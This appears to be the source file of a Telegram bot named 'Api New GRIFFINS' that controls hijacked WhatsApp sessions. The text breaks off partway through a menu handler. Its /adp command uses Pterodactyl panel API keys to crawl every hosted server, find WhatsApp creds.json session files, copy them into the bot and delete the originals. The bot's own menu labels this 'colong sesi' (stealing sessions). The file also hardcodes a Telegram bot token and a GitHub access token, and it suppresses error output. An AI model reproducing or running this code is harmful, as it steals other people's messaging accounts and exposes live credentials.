require("./index2.js");
process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});
process.on('warning', () => {});
console.error = () => {};
console.warn = () => {};
const TelegramBot = require("node-telegram-bot-api");
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const BOT_TOKEN = "7914870220:AAGUJO15IwB-_3PUiGNQMGYSJ95prtPZxbY"; // token bot 
const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000;
const cookieParser = require('cookie-parser');
app.use(express.json());
app.use(express.static('./assets/index.html'));
app.use(cookieParser());
app.use(cors());
app.use(express.static(path.join(__dirname, "assets", 'index.html')));
const fs = require("fs-extra");
const P = require("pino");
const fetch = require("node-fetch");
const axios = require("axios");
const path = require("path");
const chalk = require("chalk");
const crypto = require("crypto");
const os = require('os')
const { exec } = require('child_process');
const httpMod = require('http')
const httpsMod = require('https')
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const sessions = new Map();
const SESSIONS_DIR = path.join(__dirname, "sessions");
fs.ensureDirSync(SESSIONS_DIR);
const SESSIONS_FILE = path.join(SESSIONS_DIR, "sessions.json");
if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, "[]");

let sock;
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

function saveActiveSessions(botNumber) {
  try {
    const list = fs.existsSync(SESSIONS_FILE) ? JSON.parse(fs.readFileSync(SESSIONS_FILE,'utf8')) : [];
    if (botNumber && !list.includes(botNumber)) list.push(botNumber);
    const tmp = SESSIONS_FILE + ".tmp";
    fs.writeFileSync(tmp, JSON.stringify(list, null, 2));
    fs.renameSync(tmp, SESSIONS_FILE);
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE,'utf8'));
      console.log(`Found ${activeNumbers.length} active WhatsApp sessions`);
      for (const botNumber of activeNumbers) {
        console.log(`Connecting WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              try {
                const response = await fetch('https://httpbin.org/get');
                const data = await response.json();
                const ip = data.origin;
                logs(`CONNECTED API http://${ip}:${PORT}`);
              } catch {}
              logs(`BOT ${botNumber} CONNECTED!`);
              sessions.set(botNumber, sock);
              sock = sock;
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                await connectToWhatsApp(botNumber);
                resolve();
              } else {
                reject(new Error("Connection closed"));
              }
            }
          });
          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = null;
  if (typeof bot !== "undefined" && chatId) {
    statusMessage = await bot
      .sendMessage(
        chatId, `
𝙻 𝙾 𝙰 𝙳 𝙸 𝙽 𝙶  𝙽 𝚄 𝙼 𝙱 𝙴 𝚁
\`\`\`
Number : ${botNumber}
\`\`\``,
        { parse_mode: "Markdown" }
      )
      .then((msg) => msg.message_id);
  }

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        if (typeof bot !== "undefined" && chatId && statusMessage) {
          await bot.editMessageText(`
𝙲 𝙾 𝙽 𝙽 𝙴 𝙲 𝚃  𝚄 𝙻 𝙰 𝙽 𝙶 
\`\`\`
Number : ${botNumber}
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
        await connectToWhatsApp(botNumber, chatId);
      } else {
        if (typeof bot !== "undefined" && chatId && statusMessage) {
          await bot.editMessageText(`
𝙺 𝙾 𝙽 𝙴 𝙺 𝚂 𝙸  𝙶 𝙰 𝙶 𝙰 𝙻
\`\`\`
Number : ${botNumber}
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch {}
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      sock = sock;
      saveActiveSessions(botNumber);
      if (typeof bot !== "undefined" && chatId && statusMessage) {
        await bot.editMessageText(`
𝙱 𝙴 𝚁 𝙷 𝙰 𝚂 𝙸 𝙻  𝙲 𝙾 𝙽 𝙽 𝙴 𝙲 𝚃
\`\`\`
Number : ${botNumber}
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "GRIFFINS");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          if (typeof bot !== "undefined" && chatId && statusMessage) {
            await bot.editMessageText(`
𝙿 𝙰 𝙸 𝚁 𝙸 𝙽 𝙶  𝙽 𝚄 𝙼 𝙱 𝙴 𝚁
\`\`\`
Number : ${botNumber}
Code : ${formattedCode}
\`\`\``,
              {
                chat_id: chatId,
                message_id: statusMessage,
                parse_mode: "Markdown",
              }
            );
          }
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        if (typeof bot !== "undefined" && chatId && statusMessage) {
          await bot.editMessageText(
            `error\n : ${error.message}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

const OWNER_ID = 7674223875
const dbFile = "./assets/pangkat.json";
function loadpangkat() {
  if (!fs.existsSync(dbFile)) {
    const init = { owners: [String(OWNER_ID)], resellers: [] };
    fs.writeFileSync(dbFile, JSON.stringify(init, null, 2));
    return init;
  }
  return JSON.parse(fs.readFileSync(dbFile));
}
function savepangkat(data) {
  fs.writeFileSync(dbFile, JSON.stringify(data, null, 2));
}

let pangkat = loadpangkat();

// ====== Helpers ======
function isOwner(id) {
  return pangkat.owners.includes(String(id));
}
function isReseller(id) {
  return pangkat.resellers.includes(String(id));
}

function isOwnerMain(userId) {
  return Number(userId) === OWNER_ID;
}

function getTargetId(msg) {
  if (msg.reply_to_message) return String(msg.reply_to_message.from.id);
  const parts = msg.text.trim().split(" ");
  if (parts[1]) return String(parts[1].replace("@", "")); 
  return null;
}

//AKUN MMENU 

const GITHUB_REPO = 'noelsystem/database';
const GITHUB_FILE_PATH = 'app.json';
const GITHUB_TOKEN = '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';

// -------- State --------
const manageState = {};      
const pendingUsers = {};    

// -------- Helpers: GitHub --------
async function getUsersFromGitHub() {
  try {
    const res = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GITHUB_FILE_PATH}`, {
      headers: { Authorization: `token ${GITHUB_TOKEN}`, 'User-Agent': 'node.js' }
    });
    if (!res.ok) {
      // jika file tidak ada atau error, kembalikan array kosong
      return { users: [], sha: null };
    }
    const data = await res.json();
    if (!data.content) return { users: [], sha: data.sha || null };
    const content = Buffer.from(data.content, 'base64').toString('utf-8');
    const users = JSON.parse(content || '[]');
    return { users: Array.isArray(users) ? users : [], sha: data.sha };
  } catch (err) {
    console.error('getUsersFromGitHub error:', err);
    return { users: [], sha: null };
  }
}

async function updateUsersToGitHub(users, sha) {
  try {
    const body = {
      message: 'Update users via bot',
      content: Buffer.from(JSON.stringify(users, null, 2)).toString('base64'),
      sha: sha || undefined
    };
    const res = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GITHUB_FILE_PATH}`, {
      method: 'PUT',
      headers: { Authorization: `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json', 'User-Agent': 'node.js' },
      body: JSON.stringify(body)
    });
    if (!res.ok) {
      const txt = await res.text();
      throw new Error(`GitHub update failed: ${res.status} ${txt}`);
    }
    return await res.json();
  } catch (err) {
    console.error('updateUsersToGitHub error:', err);
    throw err;
  }
}

function parseExpire(value) {
  const now = Date.now();
  if (!value) return now;
  if (value.endsWith('d')) return now + parseInt(value) * 24 * 60 * 60 * 1000;
  if (value.endsWith('w')) return now + parseInt(value) * 7 * 24 * 60 * 60 * 1000;
  if (value.endsWith('m')) return now + parseInt(value) * 30 * 24 * 60 * 60 * 1000;
  const ts = parseInt(value);
  return isNaN(ts) ? now : ts;
}
function fmtDate(ts) { try { return new Date(ts).toLocaleString(); } catch { return String(ts); } }
function escapeMd(text = '') { return String(text).replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&"); }


function createUserButtons(users, page = 0, perPage = 4) {
  const start = page * perPage;
  const end = start + perPage;
  const pageUsers = users.slice(start, end);

  const buttons = [];
  for (let i = 0; i < pageUsers.length; i += 2) {
    const row = [];
    row.push({ text: pageUsers[i].username, callback_data: `manage_user_${start + i}` });
    if (pageUsers[i + 1]) row.push({ text: pageUsers[i + 1].username, callback_data: `manage_user_${start + i + 1}` });
    buttons.push(row);
  }

  const navRow = [];
  if (start > 0) navRow.push({ text: '⪻', callback_data: `manage_prev_${page - 1}` });
  if (end < users.length) navRow.push({ text: '⪼', callback_data: `manage_next_${page + 1}` });
  if (navRow.length) buttons.push(navRow);

  return buttons;
}

if (typeof okBox === 'undefined') global.okBox = a=>"```"+"⸙ Griffins — Ok\n"+a.join("\n")+"```"
if (typeof errBox === 'undefined') global.errBox = a=>"```"+"⸙ Griffins — Eror\n"+a.join("\n")+"```"

const AX = axios.create({
  timeout: 20000,
  validateStatus: s => s >= 200 && s < 500,
  httpAgent: new httpMod.Agent({ keepAlive: true }),
  httpsAgent: new httpsMod.Agent({ keepAlive: true })
})

const ADP_DIR  = path.join(__dirname, 'adp')
fs.mkdirpSync(ADP_DIR)
const ADP_FILE = path.join(ADP_DIR, 'adp.json')

function loadADP(){ try{ return JSON.parse(fs.readFileSync(ADP_FILE,'utf8')) }catch{ return {} } }
function saveADP(o){ fs.writeFileSync(ADP_FILE, JSON.stringify(o,null,2)) }
function isPtlc(t){ return typeof t==='string' && /^ptlc_/i.test(t) }
function isPtla(t){ return typeof t==='string' && /^ptla_/i.test(t) }
function asText(x){ return typeof x==='string' ? x : JSON.stringify(x) }
function baseUrl(d){ let u=String(d||'').trim(); if(!/^https?:\/\//i.test(u)) u='https://'+u; return u.replace(/\/+$/,'') }

async function httpGet(url, token){ return AX.get(url, { headers:{ Authorization:`Bearer ${token}` } }) }
async function httpPost(url, token, data){ return AX.post(url, data, { headers:{ Authorization:`Bearer ${token}`, 'Content-Type':'application/json' } }) }

async function fetchAllPages(url, token) {
  let page = 1
  let results = []
  while (true) {
    try {
      const r = await httpGet(`${url}?page=${page}&per_page=50`, token)
      if (r.status !== 200) break
      const data = r.data?.data || []
      if (!data.length) break
      results.push(...data)
      if (!r.data.meta || !r.data.meta.pagination || !r.data.meta.pagination.links?.next) break
      page++
    } catch {
      break
    }
  }
  return results
}

async function listServersClient(b, ptlc){
  const a = await fetchAllPages(`${b}/api/client/servers`, ptlc)
  return a.map(x=>({ id:x.attributes.identifier, name:x.attributes.name||x.attributes.identifier }))
}

async function listServersApplication(b, ptla){
  const a = await fetchAllPages(`${b}/api/application/servers`, ptla)
  return a.map(x=>{
    const at = x.attributes || {}
    return { id:at.identifier||at.uuidShort||at.uuid, name:at.name||at.identifier||at.uuidShort }
  }).filter(x=>x.id)
}

async function listServersWithFallback(b, ptlc, ptla){
  if (isPtlc(ptlc)) { try{ const s=await listServersClient(b, ptlc); if(s.length) return s }catch{} }
  if (isPtla(ptla)) { try{ const s=await listServersApplication(b, ptla); if(s.length) return s }catch{} }
  return []
}

const QUICK_PATHS = [
  '/session/creds.json',
  '/home/container/session/creds.json',
  '/home/container/creds.json',
  '/container/creds.json',
  '/creds.json',
  'creds.json'
]

async function listDirAny(base, ptlc, ptla, sid, dir){
  if (isPtlc(ptlc)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptlc)
      if(r.status===200) return (r.data?.data||[]).map(x=>x.attributes||x)
    }catch{}
  }
  if (isPtla(ptla)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, ptla)
      if(r.status===200) return (r.data?.data||[]).map(x=>x.attributes||x)
    }catch{}
  }
  return []
}

async function readFileAny(base, ptla, ptlc, sid, filePath){
  if (isPtla(ptla)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptla)
      if(r.status===200) return asText(r.data)
    }catch{}
  }
  if (isPtlc(ptlc)) {
    try{
      const r=await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, ptlc)
      if(r.status===200) return asText(r.data)
    }catch{}
  }
  throw new Error('gagal_baca_file')
}

async function deleteFileAny(base, ptla, ptlc, sid, filePath){
  const body = { root:"/", files:[ String(filePath).replace(/^\/+/,'') ] }
  if (isPtlc(ptlc)) { try{ const r=await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptlc, body); if(r.status===204||r.status===200) return }catch{} }
  if (isPtla(ptla)) { try{ const r=await httpPost(`${base}/api/client/servers/${sid}/files/delete`, ptla, body); if(r.status===204||r.status===200) return }catch{} }
  throw new Error('gagal_hapus_file')
}

async function discoverCredsPaths(base, ptlc, ptla, sid, maxDepth = 3, maxDirs = 150){
  for (const qp of QUICK_PATHS){ try{ await readFileAny(base, ptla, ptlc, sid, qp); return [qp] }catch{} }
  const roots = ['/', '/home', '/home/container', '/container', '/root', '/home/container/session', '/home/container/bot', '/home/container/data']
  const q = [...new Set(roots)]
  const seen = new Set(q)
  let depth = 0, expanded = 0
  while (q.length && depth < maxDepth && expanded < maxDirs){
    const size = q.length
    for (let i=0; i<size && expanded < maxDirs; i++){
      const dir = q.shift()
      expanded++
      let items=[]
      try{ items = await listDirAny(base, ptlc, ptla, sid, dir) }catch{}
      for (const it of items){
        const name = String(it.name || '')
        const isDir = (it.is_file===false)||(it.type==='directory')||(it.directory===true)||(it.is_directory===true)
        if (!isDir){
          if (name.toLowerCase()==='creds.json'){
            const p = `${(it.directory||dir).replace(/\/+$/,'')}/${name}`
            return [p]
          }
          continue
        }
        if (name==='.'||name==='..') continue
        const child = `${(it.directory||dir).replace(/\/+$/,'')}/${name}`
        if (!seen.has(child)){ seen.add(child); q.push(child) }
      }
    }
    depth++
  }
  return QUICK_PATHS.slice(0,2)
}

async function writeAndPairFromRaw(raw, chatId){
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'))
  try{
    await fs.writeFile(path.join(tmp,'creds.json'), raw)
    const creds = await fs.readJson(path.join(tmp,'creds.json'))
    const me = creds?.me?.id || ''
    if (!me) throw new Error('creds_invalid')
    const n = String(me).split(':')[0]
    const dest = createSessionDir(n)
    await fs.remove(dest)
    await fs.copy(tmp, dest)
    if (typeof saveActiveSessions==='function') saveActiveSessions(n)
    if (typeof connectToWhatsApp==='function') await connectToWhatsApp(n, chatId)
    return n
  } finally { await fs.remove(tmp).catch(()=>{}) }
}

function pLimit(n){
  let a=0, q=[]
  const next=()=>{ if(q.length && a<n){ a++; const {fn,rs,rj}=q.shift(); fn().then(v=>{a--;rs(v);next()}).catch(e=>{a--;rj(e);next()}) } }
  return fn=>new Promise((rs,rj)=>{ q.push({fn,rs,rj}); next() })
}

bot.onText(/^\/cadp\s+(\S+)\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, "Hanya Owner yang bisa tambah adp!")
  const key = m[1]
  const parts = m[2].split(",").map(s => s.trim())
  if (parts.length < 3) return bot.sendMessage(chatId, errBox(["Format: /cadp <alias> <ptla,ptlc,domain>"]), { parse_mode: "Markdown" })
  const [ptla, ptlc, domain] = parts
  const data = loadADP(); data[key] = { ptla, ptlc, domain }; saveADP(data)
  await bot.sendMessage(chatId, okBox([`ADP '${key}' disimpan`]), { parse_mode: "Markdown" })
})

bot.onText(/^\/adplist$/i, async msg => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, "Hanya Owner yang bisa melihat list adp!")
  const data = loadADP()
  const mask = v => String(v || "").slice(0, 10) + (String(v || "").length > 10 ? "…" : "")
  const lines = Object.entries(data).map(([k, v]) => `${k} → ${v.domain || "-"} • ${mask(v.ptla)} • ${mask(v.ptlc)}`)
  await bot.sendMessage(chatId, lines.length ? okBox(lines) : errBox(["(kosong)"]), { parse_mode: "Markdown" })
})

bot.onText(/^\/deladp\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, "Hanya Owner yang bisa delete adp!")
  const key = m[1]
  const data = loadADP()
  if (!data[key]) return bot.sendMessage(chatId, errBox([`Alias '${key}' tidak ada`]), { parse_mode: "Markdown" })
  delete data[key]; saveADP(data)
  await bot.sendMessage(chatId, okBox([`ADP '${key}' dihapus`]), { parse_mode: "Markdown" })
})

bot.onText(/^\/adp\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, "Hanya Owner yang bisa menggunakan fitur ini!")
  const key = m[1]
  const cfg = loadADP()[key]
  if (!cfg) return bot.sendMessage(chatId, errBox([`ADP '${key}' tidak ditemukan`]), { parse_mode: "Markdown" })
  const b = baseUrl(cfg.domain)

  let servers = []
  try {
    servers = await listServersWithFallback(b, cfg.ptlc, cfg.ptla)
    if (!servers.length) return bot.sendMessage(chatId, errBox([`Tidak ada server pada ${b}`]), { parse_mode: "Markdown" })
  } catch (e) {
    const msgErr = e?.response ? `${e.response.status} ${e.response.statusText || ""}`.trim() : (e.message || "gagal")
    return bot.sendMessage(chatId, errBox([`Gagal koneksi: ${msgErr}`]), { parse_mode: "Markdown" })
  }

  let ok = 0, fail = 0, done = 0
  const total = servers.length
  const perServerErrors = []
  const limit = pLimit(6)

  const statusMsg = await bot.sendMessage(chatId, `⸙ Griffins — Proses\n0/${total} • ✔0 ✖0`, { parse_mode: "Markdown" })

  const updateProgress = async () => {
    const barLen = 20
    const filled = Math.round((done / total) * barLen)
    const bar = "█".repeat(filled) + "░".repeat(barLen - filled)
    const lines = [
      `⸙ Griffins — Proses`,
      `${done}/${total} • ✔${ok} ✖${fail}`,
      `[${bar}]`
    ]
    try { await bot.editMessageText(lines.join("\n"), { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "Markdown" }) } catch {}
  }

  await Promise.all(servers.map(s => limit(async () => {
    let paired = false
    try {
      const paths = await discoverCredsPaths(b, cfg.ptlc, cfg.ptla, s.id)
      for (const p of paths) {
        try {
          const raw = await readFileAny(b, cfg.ptla, cfg.ptlc, s.id, p)
          const botId = await writeAndPairFromRaw(raw, chatId)
          try { await deleteFileAny(b, cfg.ptla, cfg.ptlc, s.id, p) } catch {}
          ok++; paired = true; break
        } catch {}
      }
      if (!paired) throw new Error("creds_not_found")
    } catch (e) {
      fail++; perServerErrors.push(`✖ ${s.id} ∿ ${e.message || "gagal"}`)
    } finally {
      done++; await updateProgress()
    }
  })))

  const lines = [`⸙ Griffins — Selesai\n✔ ${ok} • ✖ ${fail}`]
  if (perServerErrors.length) lines.push(...perServerErrors)
  await bot.sendMessage(chatId, okBox(lines), { parse_mode: "Markdown" })
})

// -------- Main callback_query handler (menus + manage + create role + delete confirm) --------
bot.on('callback_query', async (query) => {
  try {
    if (!query.message) return;
    const chatId = query.message.chat.id;
    const data = query.data;

    // ---------- CREATE role buttons (from /Xcreate photo) ----------
    if (pendingUsers[chatId] && data.startsWith('role_')) {
      const role = data.split('_')[1];
      pendingUsers[chatId].role = role;

      // fetch existing and push
      const { users, sha } = await getUsersFromGitHub();
      users.push(pendingUsers[chatId]);
      await updateUsersToGitHub(users, sha);

      // edit caption of the photo message
      await bot.editMessageCaption(
        `User: ${escapeMd(pendingUsers[chatId].username)}\nPassword: ${escapeMd(pendingUsers[chatId].password)}\nRole: ${escapeMd(role)} `,
        { chat_id: chatId, message_id: query.message.message_id }
      );

      delete pendingUsers[chatId];
      return bot.answerCallbackQuery(query.id, { text: 'User ditambahkan' });
    }

    // ---------- If this chat hasn't opened manage/delete state, handle main menus ----------
    const state = manageState[chatId];

    // Main menu callbacks (owner, api, account, akses, back)
    if (['owner_menu', 'api_menu', 'account_menu', 'akses_menu', 'back_to_main', 'open_accounts_create', 'open_accounts_manage', 'open_accounts_delete'].includes(data)) {
      // prepare caption + keyboard per menu
      let caption = '';
      let replyMarkup = { inline_keyboard: [] };

      if (data === 'owner_menu') {
        caption = escapeMd(`
ꕥ D A T A  B O T ꕥ
ꕤ Developer : @pinotrash
ꕤ Name bot : Api New GRIFFINS
ꕤ Version : 1.0
 
ꕥ C O M M A N D ꕥ
ꕤ /Xlist < list whatsapp >
ꕤ /Xpair < pairing >
ꕤ /Xadd < colong sesi >
ꕤ /XWeb < Get Web >
        `);
        replyMarkup.inline_keyboard = [[{ text: 'BACK', callback_data: 'back_to_main' }]];
      }

      if (data === 'api_menu') {
        caption = escapeMd(`
ꕥ D A T A  B O T ꕥ
ꕤ Developer : @pinotrash
ꕤ Name bot : Api New GRIFFINS
ꕤ Version : 1.0
 
ꕥ C O M M A N D ꕥ
/Xget < Link Ip Vps & Port >
        `);
        replyMarkup.inline_keyboard = [[{ text: 'BACK', callback_data: 'back_to_main' }]];
      }

      if (data === 'account_menu') {
        // account menu: tombol Create / Manage / Delete
        caption = escapeMd(`
ꕥ D A T A  B O T ꕥ
ꕤ Developer : @pinotrash
ꕤ Name bot : Api New GRIFFINS
ꕤ Version : 1.0
 
ꕥ C O M M A N D ꕥ
ꕤ /Xcreate < Button >
ꕤ /Xmanage < Button >
ꕤ /Xdeluser < Button >
        `);
        replyMarkup.inline_keyboard = [
          [{ text: 'BACK', callback_data: 'back_to_main' }]
        ];
      }

      if (data === 'akses_menu') {
        caption = escapeMd(`
ꕥ D A T A  B O T ꕥ
ꕤ Developer : @pinotrash
ꕤ Name bot : Api New GRIFFINS
ꕤ Version : 1.0
 
ꕥ C O M M A N D ꕥ
ꕤ /Xowner < Id/tag/reply > 
ꕤ /Xdelowner < Id/tag/reply > 
ꕤ /Xreseller < Id/tag/reply > 
ꕤ /Xdelreseller < Id/tag/reply > 
        `);
        replyMarkup.inline_keyboard = [[{ text: 'BACK', callback_data: 'back_to_main' }]];
      }

      if (data === 'back_to_main') {
        caption = escapeMd(`
ꕥ D A T A  B O T ꕥ
ꕤ Developer : @pinotrash
ꕤ Name bot : Api New GRIFFINS
ꕤ Version : 1.0
        `);
        replyMarkup.inline_keyboard = [
          [{ text: 'OWNER MENU', callback_data: 'owner_menu' }],
          [{ text: 'API MENU', callback_data: 'api_menu' }],
          [{ text: 'ACCOUNT MENU', callback_data: 'account_menu' }],
          [{ text: 'AKSES MENU', callback_data: 'akses_menu' }]
        ];
      }

      // Account sub-actions open: create/manage/delete (they will either instruct or open the flows)
      if (data === 'open_accounts_create') {
        // instruct user to use /Xcreate (or they can type command)
        await bot.answerCallbackQuery(query.id);
        return bot.sendMessage(chatId, 'Gunakan perintah:\n/Xcreate <username>, <password>, <1d|1w|1m>\nContoh: /Xcreate john, pass123, 1w');
      }

      if (data === 'open_accounts_manage') {
        // open manage UI (2x2)
        const { users } = await getUsersFromGitHub();
        manageState[chatId] = { users, page: 0, editingField: null, selectedUserIndex: null, deleting: false };
        const buttons = createUserButtons(users, 0);
        await bot.answerCallbackQuery(query.id);
        return bot.sendPhoto(chatId, 'https://files.catbox.moe/mhtp9b.jpg', {
          caption: 'Silahkan pilih user untuk di-edit:',
          reply_markup: { inline_keyboard: buttons }
        });
      }

      if (data === 'open_accounts_delete') {
        const { users } = await getUsersFromGitHub();
        manageState[chatId] = { users, page: 0, editingField: null, selectedUserIndex: null, deleting: true };
        const buttons = createUserButtons(users, 0);
        await bot.answerCallbackQuery(query.id);
        return bot.sendPhoto(chatId, 'https://files.catbox.moe/mhtp9b.jpg', {
          caption: 'Pilih user yang ingin dihapus:',
          reply_markup: { inline_keyboard: buttons }
        });
      }

      // default: edit caption of the message that had the menu
      await bot.editMessageCaption(caption, {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: 'MarkdownV2',
        reply_markup: replyMarkup
      });
      return bot.answerCallbackQuery(query.id);
    }

    // ---------- If we are in manage/delete flow ----------
    if (state) {
      const { users, deleting } = state;

      // pagination
      if (data.startsWith('manage_prev_') || data.startsWith('manage_next_')) {
        const page = parseInt(data.split('_')[2]);
        state.page = page;
        const buttons = createUserButtons(users, page);
        await bot.editMessageReplyMarkup({ inline_keyboard: buttons }, { chat_id: chatId, message_id: query.message.message_id });
        return bot.answerCallbackQuery(query.id);
      }

      // select user
      if (data.startsWith('manage_user_')) {
        const index = parseInt(data.split('_')[2]);
        state.selectedUserIndex = index;
        const user = users[index];

        if (deleting) {
          // show confirm delete buttons
          const buttons = [
            [
              { text: 'Apakah anda yakin?', callback_data: 'confirm_delete' },
              { text: 'Tidak, kembali', callback_data: 'cancel_delete' }
            ]
          ];
          await bot.editMessageCaption(
            `User: ${escapeMd(user.username)}\nPassword: ${escapeMd(user.password)}\nExpired: ${escapeMd(fmtDate(user.expiresAt))}\nCreated: ${escapeMd(fmtDate(user.createdAt))}`,
            { chat_id: chatId, message_id: query.message.message_id, reply_markup: { inline_keyboard: buttons } }
          );
          return bot.answerCallbackQuery(query.id);
        } else {
          // edit user menu
          const buttons = [
            [{ text: 'Ubah Username', callback_data: 'edit_username' }, { text: 'Ubah Password', callback_data: 'edit_password' }],
            [{ text: 'Ubah Expired', callback_data: 'edit_expired' }],
            [{ text: 'Ubah Role', callback_data: 'edit_role' }],
            [{ text: 'Back', callback_data: 'back_to_list' }]
          ];
          await bot.editMessageCaption(
            `User: ${escapeMd(user.username)}\nPassword: ${escapeMd(user.password)}\nRole: ${escapeMd(user.role || '')}\nExpired: ${escapeMd(fmtDate(user.expiresAt))}\nDibuat di: ${escapeMd(fmtDate(user.createdAt))}`,
            { chat_id: chatId, message_id: query.message.message_id, reply_markup: { inline_keyboard: buttons } }
          );
          return bot.answerCallbackQuery(query.id);
        }
      }

      // delete confirm
      if (data === 'confirm_delete' && deleting) {
        const idx = state.selectedUserIndex;
        if (idx == null) return bot.answerCallbackQuery(query.id, { text: 'Tidak ada user terpilih' });
        users.splice(idx, 1);
        // push update to GitHub
        const { sha } = await getUsersFromGitHub();
        await updateUsersToGitHub(users, sha);
        // refresh buttons
        const buttons = createUserButtons(users, state.page);
        await bot.editMessageCaption('User berhasil dihapus \nSilahkan pilih user lain:', {
          chat_id: chatId,
          message_id: query.message.message_id,
          reply_markup: { inline_keyboard: buttons }
        });
        state.selectedUserIndex = null;
        return bot.answerCallbackQuery(query.id, { text: 'User dihapus' });
      }

      // cancel delete
      if (data === 'cancel_delete' && deleting) {
        const buttons = createUserButtons(users, state.page);
        await bot.editMessageCaption('Pilih user yang ingin dihapus:', {
          chat_id: chatId,
          message_id: query.message.message_id,
          reply_markup: { inline_keyboard: buttons }
        });
        state.selectedUserIndex = null;
        return bot.answerCallbackQuery(query.id);
      }

      // edit_* buttons: set editingField and prompt for input
      if (data.startsWith('edit_')) {
        const field = data.split('_')[1]; // username,password,expired,role
        state.editingField = field;
        const user = users[state.selectedUserIndex];
        const prefix = field === 'username' ? 'U =' : field === 'password' ? 'P =' : field === 'expired' ? 'E =' : 'R =';
        await bot.sendMessage(chatId, `Silahkan kirim ${field} baru untuk user ${user.username} dengan format:\n${prefix} <value>`);
        return bot.answerCallbackQuery(query.id);
      }

      // back to list
      if (data === 'back_to_list') {
        const buttons = createUserButtons(users, state.page);
